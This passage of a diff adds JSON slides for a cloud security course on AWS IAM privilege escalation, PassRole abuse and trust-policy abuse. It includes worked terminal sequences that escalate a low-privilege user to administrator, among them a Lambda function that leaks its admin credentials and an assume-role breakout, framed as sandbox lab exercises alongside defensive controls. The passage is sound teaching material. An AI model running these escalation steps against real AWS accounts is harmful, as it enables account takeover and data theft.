+                  "detail": "e.g. iam:AttachUserPolicy"
+                },
+                {
+                  "label": "Grant self more",
+                  "detail": "Attach AdministratorAccess"
+                },
+                {
+                  "label": "Full admin",
+                  "detail": "Account takeover"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How the escalation primitives work",
+            "body": "Each primitive follows the same shape: a permission that **writes to the identity system itself**. IAM is just an API — creating a policy, attaching a policy, or making a key are all API calls. If your foothold can call one of these write APIs, it can rewrite its own authorization.\n\nThe catalogue groups into families:\n\n- **Policy manipulation**: `iam:CreatePolicyVersion`, `iam:SetDefaultPolicyVersion`, `iam:AttachUserPolicy`, `iam:PutUserPolicy`, `iam:AttachGroupPolicy`, `iam:AttachRolePolicy` — directly edit what a policy allows.\n- **Credential creation**: `iam:CreateAccessKey` (on another user), `iam:CreateLoginProfile`, `iam:UpdateLoginProfile` — mint credentials for a more-privileged identity.\n- **Role abuse**: `iam:PassRole` + a compute service, `iam:UpdateAssumeRolePolicy`, `sts:AssumeRole` — borrow or redirect a privileged role.\n\nThe key insight: a permission is only safe in the context of **what it can be pointed at**. `iam:CreatePolicyVersion` sounds like versioning; it actually lets you write a brand-new policy document and make it live.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Policy manipulation",
+                  "points": [
+                    "CreatePolicyVersion",
+                    "SetDefaultPolicyVersion",
+                    "AttachUserPolicy",
+                    "PutUserPolicy"
+                  ]
+                },
+                {
+                  "label": "Credential creation",
+                  "points": [
+                    "CreateAccessKey",
+                    "CreateLoginProfile",
+                    "UpdateLoginProfile"
+                  ]
+                },
+                {
+                  "label": "Role abuse",
+                  "points": [
+                    "PassRole + service",
+                    "UpdateAssumeRolePolicy",
+                    "sts:AssumeRole"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            },
+            "check": {
+              "question": "Why is iam:CreatePolicyVersion considered a privilege-escalation permission rather than a harmless versioning feature?",
+              "options": [
+                "It lets you write a new policy document with any permissions and set it as the default/active version",
+                "It deletes old policy versions permanently",
+                "It only renames existing policies",
+                "It requires MFA, so it is actually a security control"
+              ],
+              "correctIndex": 0,
+              "explanation": "CreatePolicyVersion creates a fresh version of a managed policy from a document you supply. Combined with SetDefaultPolicyVersion (or using --set-as-default), you can make a policy grant `*:*` and attackers inherit admin. The 'versioning' framing hides that it is arbitrary policy authoring."
+            }
+          },
+          {
+            "title": "Worked example: CreatePolicyVersion to admin",
+            "body": "Suppose your leaked user `dev-ci` is allowed `iam:CreatePolicyVersion` on a managed policy that is already attached to it. You write a new version that allows everything, set it as default, and you are now admin.\n\nAWS managed policies cannot be edited, but **customer-managed** policies can — and real environments attach plenty of those to CI/automation users. The `--set-as-default` flag makes the new version live immediately.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws iam get-user",
+                  "output": "User: arn:aws:iam::111122223333:user/dev-ci"
+                },
+                {
+                  "command": "aws iam list-attached-user-policies --user-name dev-ci",
+                  "output": "AttachedPolicies: CI-Deploy-Policy (arn ...:policy/CI-Deploy-Policy)"
+                },
+                {
+                  "command": "cat admin.json",
+                  "output": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}"
+                },
+                {
+                  "command": "aws iam create-policy-version --policy-arn arn:aws:iam::111122223333:policy/CI-Deploy-Policy --policy-document file://admin.json --set-as-default",
+                  "output": "PolicyVersion: v5  IsDefaultVersion: true"
+                },
+                {
+                  "command": "aws iam list-attached-user-policies --user-name dev-ci  # now effectively *:* ",
+                  "output": "dev-ci now has Action:* Resource:* — full administrator"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Variants: the catalogue at a glance",
+            "body": "Rhino's research counts ~21 distinct methods. You do not memorise all of them — you learn the **categories** and recognise the dangerous verb when you see it in a policy. Important nuances:\n\n- Some primitives are **direct** (one API call escalates): `AttachUserPolicy` with AdministratorAccess.\n- Some are **two-step**: `CreatePolicyVersion` then `SetDefaultPolicyVersion`; `PassRole` then `lambda:CreateFunction` + `lambda:InvokeFunction`.\n- Some need a **principal you control to receive the power**: `UpdateAssumeRolePolicy` makes a privileged role trust *you*, then you AssumeRole into it.\n- Group-based: `iam:AddUserToGroup` where the group has admin.\n\nContext matters: `iam:PassRole` is useless alone — it is only an escalation when paired with a service (Lambda, EC2, Glue, CloudFormation) that will *assume* the role you pass.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "foothold",
+                  "label": "Low-priv principal",
+                  "highlighted": true
+                },
+                {
+                  "id": "direct",
+                  "label": "Direct (1 call)"
+                },
+                {
+                  "id": "twostep",
+                  "label": "Two-step"
+                },
+                {
+                  "id": "recv",
+                  "label": "Make role trust me"
+                },
+                {
+                  "id": "admin",
+                  "label": "Administrator",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "foothold",
+                  "to": "direct",
+                  "label": "AttachUserPolicy"
+                },
+                {
+                  "from": "foothold",
+                  "to": "twostep",
+                  "label": "PassRole+Lambda"
+                },
+                {
+                  "from": "foothold",
+                  "to": "recv",
+                  "label": "UpdateAssumeRolePolicy"
+                },
+                {
+                  "from": "direct",
+                  "to": "admin",
+                  "label": ""
+                },
+                {
+                  "from": "twostep",
+                  "to": "admin",
+                  "label": ""
+                },
+                {
+                  "from": "recv",
+                  "to": "admin",
+                  "label": "AssumeRole"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How to spot and test for it",
+            "body": "You find these by **reading the effective permissions** of your foothold and matching them against the catalogue.\n\n1. Identify who you are: `aws sts get-caller-identity`.\n2. Enumerate your permissions: `aws iam list-attached-user-policies`, `list-user-policies`, `list-groups-for-user`, and for each policy `get-policy-version` to read the document.\n3. Grep the allowed actions for the dangerous verbs: any `iam:*` write, `iam:PassRole`, `sts:AssumeRole`, `iam:CreateAccessKey`, `iam:Update*`.\n4. For each hit, confirm the **resource scope** — `Resource: *` or a broad ARN is the exploitable case; a tightly scoped resource may be safe.\n\nIf you lack read access to your own policies (common for scoped CI users), you can still *try* the actions; AWS returns `AccessDenied` for what you cannot do, which itself maps your surface.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws sts get-caller-identity",
+                  "output": "Arn: arn:aws:iam::111122223333:user/dev-ci"
+                },
+                {
+                  "command": "aws iam get-policy-version --policy-arn ...:policy/CI-Deploy-Policy --version-id v4 --query 'PolicyVersion.Document.Statement[].Action'",
+                  "output": "[ \"s3:*\", \"iam:PassRole\", \"lambda:*\" ]  <- PassRole + lambda = escalation path"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do it — the lab",
+            "body": "In this module's labs you run these against sandboxes you own. The **CloudGoat PrivEsc Scenarios** lab (Rhino's CloudGoat, deployed with Terraform into your own AWS account) hands you a deliberately weak starting principal and asks you to reach admin through a catalogue primitive, then write the blocking control.\n\nHands-on step for this topic:\n1. Deploy a CloudGoat scenario such as `iam_privesc_by_rollback` (it gives a user with `iam:CreatePolicyVersion`-style access).\n2. Enumerate your permissions as above.\n3. Identify the single dangerous permission and exploit it to gain admin.\n4. Capture the escalation as a one-line finding: the exact API call and the exact permission that allowed it.\n\nGolden rule from the course: only ever test accounts you own or are explicitly authorised to test. Never run these primitives against a third party's AWS account.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Deploy CloudGoat",
+                  "detail": "./cloudgoat.py create iam_privesc_by_rollback"
+                },
+                {
+                  "label": "Enumerate",
+                  "detail": "Read your own policy versions"
+                },
+                {
+                  "label": "Exploit",
+                  "detail": "Roll back to a more-permissive version"
+                },
+                {
+                  "label": "Report",
+                  "detail": "API call + permission + fix"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Defend and harden",
+            "body": "Every primitive maps to a precise control. You do not 'remove IAM' — you remove the *self-referential* power.\n\n- **Least privilege**: never grant `iam:*` or broad `iam:Attach*`, `iam:Put*`, `iam:Create*Version` to non-admin principals. Scope IAM write actions to admins only.\n- **Permission boundaries**: attach a boundary to every developer/CI role that caps the maximum effective permission, so even if they attach AdministratorAccess the boundary still denies it.\n- **Service Control Policies (SCPs)**: at the Organizations level, Deny `iam:CreatePolicyVersion`, `iam:AttachUserPolicy`, `iam:UpdateAssumeRolePolicy`, etc. for everyone except a break-glass admin.\n- **Detect**: CloudTrail alerts on `CreatePolicyVersion`, `AttachUserPolicy`, `CreateAccessKey`, `UpdateAssumeRolePolicy`.\n\nKey: a permission boundary and an identity policy must **both** allow an action, so a boundary that omits `iam:*` neutralises the whole catalogue for that principal.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Attack permission",
+                  "points": [
+                    "iam:AttachUserPolicy",
+                    "iam:CreatePolicyVersion",
+                    "iam:PassRole *",
+                    "iam:UpdateAssumeRolePolicy"
+                  ]
+                },
+                {
+                  "label": "Control that kills it",
+                  "points": [
+                    "SCP Deny for non-admins",
+                    "SCP Deny / boundary omits it",
+                    "PassRole scoped by PassedToService + ARN",
+                    "SCP Deny on privileged roles"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "IAM privilege escalation is the pivot that turns a minor leak into a full breach. A single leaked low-privilege access key — from a public GitHub commit, an SSRF against instance metadata, or a compromised CI job — is usually not game over. It becomes game over *because* one over-broad permission in the catalogue lets the attacker self-promote to admin and then do anything: read every bucket, mint persistence, exfiltrate data, run crypto-miners.\n\nThis is why identity is called 'the new perimeter' in cloud. There is no network edge to defend; the boundary is what each principal is allowed to do. Most high-impact AWS bug-bounty and incident reports are an escalation-catalogue finding at their core.\n\nMastering this catalogue means that when you read any IAM policy, dangerous verbs jump out at you — both to exploit in an authorised test and to fix as a defender.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Leaked low-priv key",
+                  "detail": "GitHub / SSRF / CI"
+                },
+                {
+                  "label": "One catalogue permission",
+                  "detail": "Over-broad iam: action"
+                },
+                {
+                  "label": "Self-promote to admin",
+                  "detail": "Escalation primitive"
+                },
+                {
+                  "label": "Full breach",
+                  "detail": "Data, persistence, abuse"
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m4-2",
+        "moduleId": "cloud-m4",
+        "number": 22,
+        "title": "PassRole & Service-Assumed Roles",
+        "type": "lab",
+        "week": 2,
+        "description": "The most common real-world escalation. If you can pass a privileged role to a compute service you control, you inherit its permissions. Students exploit it via Lambda, EC2 and Glue.",
+        "keyPoints": [
+          "iam:PassRole is meaningless alone — it needs a service that will assume the role",
+          "Lambda: create a function with a passed admin role, invoke, use its credentials",
+          "EC2: launch an instance with an instance profile, read its metadata credentials",
+          "CloudFormation / Glue / SageMaker as alternative PassRole sinks",
+          "Mitigation: scope PassRole with iam:PassedToService and resource ARNs"
+        ],
+        "slides": [
+          {
+            "title": "What PassRole abuse is",
+            "body": "`iam:PassRole` is the permission to **hand an existing IAM role to an AWS service** when you create or configure something. For example, when you create a Lambda function you specify an execution role; AWS checks that you are allowed to `PassRole` that role.\n\nAnalogy: PassRole is like being allowed to assign a uniform to a robot. You cannot wear the uniform yourself, but if you can build a robot and tell it 'wear the admin uniform and do what I say', you now act with admin power through the robot.\n\nThe robot is a compute service — Lambda, EC2, Glue, CloudFormation, SageMaker. The uniform is a privileged role. If your foothold can (a) pass a powerful role and (b) create/run one of these services, you **inherit the role's permissions** by making the service run your code or expose its credentials.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "You",
+                  "detail": "Have iam:PassRole + a service create perm"
+                },
+                {
+                  "label": "Create service",
+                  "detail": "Lambda / EC2 with the passed role"
+                },
+                {
+                  "label": "Service assumes role",
+                  "detail": "Gets the role's temp creds"
+                },
+                {
+                  "label": "You run as role",
+                  "detail": "Inherit admin permissions"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How it works, step by step",
+            "body": "The trust chain has two authorization checks that both must pass:\n\n1. **Can you pass this role?** The service create-call verifies your `iam:PassRole` permission for that specific role ARN.\n2. **Does the role trust the service?** The role's *trust policy* must allow the service principal (e.g. `lambda.amazonaws.com`) to assume it. Most real admin/automation roles already do, because they are used by these services legitimately.\n\nWhen both pass, the service obtains STS temporary credentials for the role and runs. You then either (a) make the service execute your code, or (b) read the credentials it was handed.\n\nSo the pre-conditions for exploitation are: you can `PassRole` a privileged role + you can create/invoke a service + that role trusts that service. In loose environments, a wildcard `iam:PassRole` on `Resource: *` satisfies the first for every role at once.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "you",
+                  "label": "Foothold principal",
+                  "highlighted": true
+                },
+                {
+                  "id": "pass",
+                  "label": "iam:PassRole check"
+                },
+                {
+                  "id": "trust",
+                  "label": "Role trust policy check"
+                },
+                {
+                  "id": "run",
+                  "label": "Service runs as role",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "you",
+                  "to": "pass",
+                  "label": "pass admin role?"
+                },
+                {
+                  "from": "pass",
+                  "to": "trust",
+                  "label": "role trusts lambda?"
+                },
+                {
+                  "from": "trust",
+                  "to": "run",
+                  "label": "both allow"
+                }
+              ]
+            },
+            "check": {
+              "question": "Besides your own iam:PassRole permission, what else must be true for a PassRole-to-Lambda escalation to work?",
+              "options": [
+                "The target role's trust policy must allow lambda.amazonaws.com to assume it",
+                "The target role must have no permissions at all",
+                "You must be the root user",
+                "The Lambda must be written in Python specifically"
+              ],
+              "correctIndex": 0,
+              "explanation": "Two checks gate it: your PassRole permission AND the role's trust policy allowing the service principal (lambda.amazonaws.com). If the role doesn't trust Lambda, Lambda can't assume it and the escalation fails for that sink."
+            }
+          },
+          {
+            "title": "Worked example: PassRole via Lambda",
+            "body": "Your foothold `dev-ci` has `iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction`. There is an existing role `prod-admin-role` with AdministratorAccess that trusts Lambda. You create a function that runs code with that role and have it exfiltrate its own credentials (or just call admin APIs directly inside the function).",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws iam list-roles --query \"Roles[?contains(RoleName,'admin')].[RoleName,Arn]\"",
+                  "output": "prod-admin-role  arn:aws:iam::111122223333:role/prod-admin-role"
+                },
+                {
+                  "command": "zip func.zip index.py   # handler prints sts creds via env + metadata",
+                  "output": "adding: index.py"
+                },
+                {
+                  "command": "aws lambda create-function --function-name pwn --runtime python3.12 --role arn:aws:iam::111122223333:role/prod-admin-role --handler index.handler --zip-file fileb://func.zip",
+                  "output": "FunctionArn: ...:function:pwn  State: Active"
+                },
+                {
+                  "command": "aws lambda invoke --function-name pwn out.json && cat out.json",
+                  "output": "{ \"AccessKeyId\": \"ASIA...\", \"SecretAccessKey\": \"...\", \"Token\": \"...\" }  <- admin creds"
+                },
+                {
+                  "command": "AWS_ACCESS_KEY_ID=ASIA... aws iam attach-user-policy --user-name dev-ci --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+                  "output": "(success) dev-ci is now permanent admin"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Variants: other PassRole sinks",
+            "body": "Lambda is the easiest, but any service that assumes a role you can pass is a sink. Pick the one your foothold has create rights for:\n\n- **EC2**: launch an instance with the admin role as its *instance profile*, then read credentials from the Instance Metadata Service (IMDS) at `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Needs `ec2:RunInstances` + `iam:PassRole`.\n- **Glue**: create a Glue dev endpoint or job with the passed role and run code in it.\n- **CloudFormation**: pass a role to a stack; the stack acts with that role's permissions to create resources you define.\n- **SageMaker / DataPipeline / CodeBuild**: notebook or build runs as the passed role.\n\nNuance: EC2 requires that the role be wrapped in an **instance profile** (same name usually). For EC2 you often need `iam:PassRole` + `ec2:RunInstances` + an existing instance profile, and IMDSv2 may require a token header.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Lambda sink",
+                  "points": [
+                    "lambda:CreateFunction",
+                    "lambda:InvokeFunction",
+                    "Read creds in handler"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "EC2 sink",
+                  "points": [
+                    "ec2:RunInstances",
+                    "Instance profile needed",
+                    "Read IMDS 169.254.169.254"
+                  ]
+                },
+                {
+                  "label": "Other sinks",
+                  "points": [
+                    "Glue job/endpoint",
+                    "CloudFormation stack role",
+                    "SageMaker / CodeBuild"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "How to find and test it",
+            "body": "Hunt for the three ingredients:\n\n1. **Do you have PassRole?** Read your policies for `iam:PassRole`. Note the resource scope — `*` means any role; a specific ARN limits you to that role.\n2. **Which privileged roles exist and are passable?** `aws iam list-roles`, then inspect each role's attached policies for admin, and its **trust policy** (`AssumeRolePolicyDocument`) for `lambda.amazonaws.com`, `ec2.amazonaws.com`, etc.\n3. **Which service can you create?** Check for `lambda:CreateFunction`, `ec2:RunInstances`, `glue:*`, `cloudformation:CreateStack`.\n\nThe winning combination is: a passable role with admin that trusts a service you can create. Pacu's `iam__privesc_scan` automates this discovery across the account.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws iam get-role --role-name prod-admin-role --query 'Role.AssumeRolePolicyDocument.Statement[].Principal'",
+                  "output": "[ { \"Service\": \"lambda.amazonaws.com\" } ]  <- trusts Lambda, passable sink"
+                },
+                {
+                  "command": "aws iam list-attached-role-policies --role-name prod-admin-role",
+                  "output": "AdministratorAccess  <- privileged target confirmed"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do it — PassRole to Admin lab",
+            "body": "This module's headline lab, **PassRole to Admin** (AWS free tier + Pacu), gives you a principal with `iam:PassRole` and `lambda:CreateFunction` and asks you to escalate to AdministratorAccess and capture the admin session.\n\nHands-on steps:\n1. `aws sts get-caller-identity` to confirm your foothold.\n2. Enumerate roles and find one with admin that trusts Lambda.\n3. Write a tiny handler that returns its own credentials (or directly performs an admin action such as attaching AdministratorAccess to your user).\n4. `create-function` with the passed role, `invoke`, and capture the result.\n5. Prove admin by performing one action your original principal was denied.\n6. Optionally run Pacu's `iam__privesc_scan` first and confirm it flags the same path.\n\nRun only in your own sandbox account. Tear the function and any created users down afterwards.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Enumerate",
+                  "detail": "Find admin role trusting Lambda"
+                },
+                {
+                  "label": "Craft function",
+                  "detail": "Handler leaks creds / acts as admin"
+                },
+                {
+                  "label": "Create + invoke",
+                  "detail": "PassRole the admin role"
+                },
+                {
+                  "label": "Prove + clean up",
+                  "detail": "Do an admin-only action, then delete"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Defend and harden",
+            "body": "The fix is to **scope PassRole precisely** — it is the single most important IAM condition in a real account.\n\n- Never grant `iam:PassRole` on `Resource: *`. Restrict to the exact role ARNs a principal legitimately needs to pass.\n- Add the **`iam:PassedToService`** condition so a role can only be passed to the intended service:\n```\n\"Condition\": { \"StringEquals\": { \"iam:PassedToService\": \"lambda.amazonaws.com\" } }\n```\n- Keep privileged roles' **trust policies narrow** — an admin role should not casually trust `lambda.amazonaws.com` if humans, not functions, use it.\n- Separate duties: the principal that can create Lambdas should not also be able to pass high-privilege roles.\n- Detect with CloudTrail: `CreateFunction` / `RunInstances` events where the role passed is far more privileged than the caller.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Dangerous",
+                  "points": [
+                    "PassRole Resource:*",
+                    "Admin role trusts all services",
+                    "Same principal creates Lambda + passes admin role"
+                  ]
+                },
+                {
+                  "label": "Hardened",
+                  "points": [
+                    "PassRole scoped to exact role ARNs",
+                    "iam:PassedToService condition",
+                    "Narrow trust policy, separation of duties"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "PassRole abuse is the **most common real-world cloud privilege escalation**. It appears constantly in incident reports and CloudGoat-style training because loose `iam:PassRole` on `*` is an extremely frequent misconfiguration — automation and IaC tooling 'just needs it to work', so engineers widen it.\n\nIt is dangerous because it bridges two systems that each look harmless alone: 'can create a Lambda' and 'can pass a role' are both innocuous-sounding, yet together they are admin. Defenders who only review identity policies action-by-action miss it; you have to reason about the *combination* and the role's trust.\n\nFor a hunter, finding a wildcard PassRole paired with any compute-create permission is often a critical finding. For a defender, the `iam:PassedToService` condition and scoped role ARNs close one of the widest escalation doors in AWS.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "'Harmless' perms",
+                  "detail": "PassRole:* + lambda:CreateFunction"
+                },
+                {
+                  "label": "Combine",
+                  "detail": "Pass admin role to your function"
+                },
+                {
+                  "label": "Inherit admin",
+                  "detail": "Critical escalation"
+                },
+                {
+                  "label": "Fix",
+                  "detail": "Scope PassRole + PassedToService"
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m4-3",
+        "moduleId": "cloud-m4",
+        "number": 23,
+        "title": "Trust Policy Abuse & Confused Deputy",
+        "type": "lab",
+        "week": 2,
+        "description": "Roles are only as safe as their trust policy. Students exploit over-broad Principal statements, missing ExternalId and wildcard trusts to assume roles they shouldn't.",
+        "keyPoints": [
+          "Principal '*' or whole-account trust ('arn:aws:iam::ACCOUNT:root') pitfalls",
+          "Missing ExternalId enabling cross-account confused-deputy",
+          "Third-party vendor roles trusting an account you can influence",
+          "OIDC/web-identity trust misconfig (e.g. GitHub Actions 'sub' claim wildcards)",
+          "Mitigation: tight Principal, ExternalId, and aws:PrincipalOrgID conditions"
+        ],
+        "slides": [
+          {
+            "title": "What trust-policy abuse is",
+            "body": "An IAM **role** has two policies: a *permission policy* (what it can do) and a *trust policy* (who is allowed to become it). The trust policy — formally the `AssumeRolePolicyDocument` — lists the **principals** permitted to call `sts:AssumeRole` on the role.\n\nAnalogy: a role is a costume with powers. The trust policy is the guest list at the costume's door. If the guest list says 'anyone' (`Principal: *`) or 'anyone from this whole building' (whole-account root), then people who should never wear the costume can walk in and put it on.\n\nTrust-policy abuse means exploiting an over-broad or misconfigured guest list to assume a role you were never meant to have. Because the role's *permissions* are unchanged, the mistake is purely about **who is allowed in**.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Permission policy",
+                  "points": [
+                    "WHAT the role can do",
+                    "e.g. AdministratorAccess"
+                  ]
+                },
+                {
+                  "label": "Trust policy",
+                  "points": [
+                    "WHO can assume the role",
+                    "The exploitable guest list"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How trust is evaluated",
+            "body": "When you call `sts:AssumeRole`, AWS checks the role's trust policy:\n\n1. Is your principal (user/role ARN or account) listed under `Principal`?\n2. Do all `Condition` keys match (e.g. `sts:ExternalId`, `aws:PrincipalOrgID`, `aws:SourceIp`)?\n3. Does *your own* identity policy allow `sts:AssumeRole` on that role?\n\nIf all pass, STS returns temporary credentials for the role. The dangerous shapes:\n\n- `Principal: \"*\"` — literally anyone in any AWS account can assume it (needs only `sts:AssumeRole` on their side).\n- `Principal: { \"AWS\": \"arn:aws:iam::ACCOUNT:root\" }` — trusts the *entire* account, so any principal in that account (including a low-priv one you compromised) can assume it.\n- A trust on a third-party vendor account that you can influence, with **no ExternalId** — the classic cross-account confused deputy.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "sts:AssumeRole call",
+                  "detail": "Caller requests the role"
+                },
+                {
+                  "label": "Principal match?",
+                  "detail": "Is caller on the guest list"
+                },
+                {
+                  "label": "Conditions match?",
+                  "detail": "ExternalId, OrgID, SourceIp"
+                },
+                {
+                  "label": "Temp creds issued",
+                  "detail": "Caller now acts as role"
+                }
+              ]
+            },
+            "check": {
+              "question": "A role's trust policy sets Principal to 'arn:aws:iam::111122223333:root'. What does this actually allow?",
+              "options": [
+                "Any principal in account 111122223333 (if their own policy allows sts:AssumeRole) can assume the role",
+                "Only the AWS root user of 111122223333 can assume it",
+                "Nobody can assume it because root is blocked",
+                "Only roles, never users, in that account can assume it"
+              ],
+              "correctIndex": 0,
+              "explanation": "':root' in a trust policy means the whole account, not the root user. It delegates the assume decision to that account's IAM — so any principal there with sts:AssumeRole permission can assume the role. A compromised low-priv user in that account is enough."
+            }
+          },
+          {
+            "title": "Worked example: whole-account trust breakout",
+            "body": "You compromised a low-privilege user in account `111122223333`. There is a role `break-glass-admin` whose trust policy is the lazy `:root` form. Your own user policy happens to allow `sts:AssumeRole` on `*` (also common). You simply assume the role and receive admin credentials.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws iam get-role --role-name break-glass-admin --query 'Role.AssumeRolePolicyDocument.Statement[].Principal'",
+                  "output": "[ { \"AWS\": \"arn:aws:iam::111122223333:root\" } ]  <- trusts whole account"
+                },
+                {
+                  "command": "aws iam list-attached-role-policies --role-name break-glass-admin",
+                  "output": "AdministratorAccess"
+                },
+                {
+                  "command": "aws sts assume-role --role-arn arn:aws:iam::111122223333:role/break-glass-admin --role-session-name demo",
+                  "output": "Credentials: { AccessKeyId: ASIA..., SecretAccessKey: ..., SessionToken: ... }"
+                },
+                {
+                  "command": "AWS_SESSION_TOKEN=... aws sts get-caller-identity",
+                  "output": "Arn: arn:aws:sts::111122223333:assumed-role/break-glass-admin/demo  <- now admin"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Variants and nuances",
+            "body": "Trust abuse has several flavours, each tied to a missing guardrail:\n\n- **Wildcard Principal (`*`)**: anyone, any account. Rare but catastrophic.\n- **Whole-account (`:root`)**: trusts every principal in an account — fine if that account is tightly controlled, deadly if you can get any foothold there.\n- **Missing ExternalId (confused deputy)**: a vendor role trusts a SaaS provider's account to manage your resources. Without a secret `sts:ExternalId`, an attacker who is *also* a customer of that SaaS can trick it into assuming *your* role.\n- **OIDC / web-identity misconfig**: roles for GitHub Actions trust `token.actions.githubusercontent.com`. If the `sub` claim condition is a wildcard (`repo:*`) instead of `repo:myorg/myrepo:ref:refs/heads/main`, any GitHub repo's workflow can assume your role.\n- **`UpdateAssumeRolePolicy`** (from topic 1): if you can *edit* a trust policy, you add yourself as a principal — escalation by rewriting the guest list.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "role",
+                  "label": "Over-trusting role",
+                  "highlighted": true
+                },
+                {
+                  "id": "star",
+                  "label": "Principal:* (anyone)"
+                },
+                {
+                  "id": "root",
+                  "label": ":root (whole account)"
+                },
+                {
+                  "id": "ext",
+                  "label": "No ExternalId (vendor)"
+                },
+                {
+                  "id": "oidc",
+                  "label": "Wildcard OIDC sub"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "star",
+                  "to": "role",
+                  "label": "assume"
+                },
+                {
+                  "from": "root",
+                  "to": "role",
+                  "label": "any foothold"
+                },
+                {
+                  "from": "ext",
+                  "to": "role",
+                  "label": "confused deputy"
+                },
+                {
+                  "from": "oidc",
+                  "to": "role",
+                  "label": "any repo CI"
+                }
+              ]
+            }
+          },
+          {
+            "title": "The confused-deputy / ExternalId nuance",
+            "body": "This is the subtle one and a favourite exam trap. A monitoring SaaS 'Acme' needs to read your account, so you create a role trusting Acme's AWS account (`arn:aws:iam::ACME:root`) with `sts:AssumeRole`.\n\nThe problem: *every* Acme customer is served by that same Acme account. If the role has no further check, a malicious Acme customer could ask Acme to assume **your** role ARN, and Acme — the confused deputy — would do it, acting with your account's permissions on the attacker's behalf.\n\nThe fix AWS designed for exactly this is **`sts:ExternalId`**: Acme assigns each customer a unique secret and includes it in the AssumeRole call; your trust policy requires *your* value. An attacker does not know your ExternalId, so Acme cannot be tricked into assuming your role. A missing or guessable ExternalId is a reportable cross-account finding.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Acme SaaS (deputy)",
+              "rightLabel": "Your account's STS",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "AssumeRole attacker-induced",
+                  "payload": "RoleArn: your-role, ExternalId: (missing)"
+                },
+                {
+                  "direction": "left",
+                  "label": "Without ExternalId: granted -> abuse",
+                  "payload": "Creds for your-role issued to deputy"
+                },
+                {
+                  "direction": "right",
+                  "label": "With required ExternalId",
+                  "payload": "ExternalId: wrong/absent"
+                },
+                {
+                  "direction": "left",
+                  "label": "AccessDenied -> confused deputy blocked",
+                  "payload": "Condition sts:ExternalId not met"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do it — Trust Policy Breakout lab",
+            "body": "The **Trust Policy Breakout** lab (AWS free tier) gives you an over-trusting role's AssumeRole policy; you gain its permissions, then rewrite the trust to close it.\n\nHands-on steps:\n1. As your low-priv principal, enumerate roles: `aws iam list-roles`.\n2. For each, read `AssumeRolePolicyDocument` and spot the over-broad `Principal` (`*`, `:root`, missing ExternalId, wildcard OIDC `sub`).\n3. Confirm the role is worth having (`list-attached-role-policies`).\n4. `aws sts assume-role` and export the returned credentials.\n5. Prove access with `get-caller-identity` and one action only the role can do.\n6. Remediate: tighten the trust `Principal` to the exact needed ARN and add a `Condition` (ExternalId / `aws:PrincipalOrgID`), then re-run your assume and confirm `AccessDenied`.\n\nVerification is the point: your fix is correct only when it blocks the exact breakout you just performed.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Read trust policies",
+                  "detail": "Find broad Principal"
+                },
+                {
+                  "label": "AssumeRole",
+                  "detail": "Get the role's creds"
+                },
+                {
+                  "label": "Prove access",
+                  "detail": "get-caller-identity"
+                },
+                {
+                  "label": "Tighten + re-test",
+                  "detail": "Scope Principal, add condition, expect Deny"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Defend and harden",
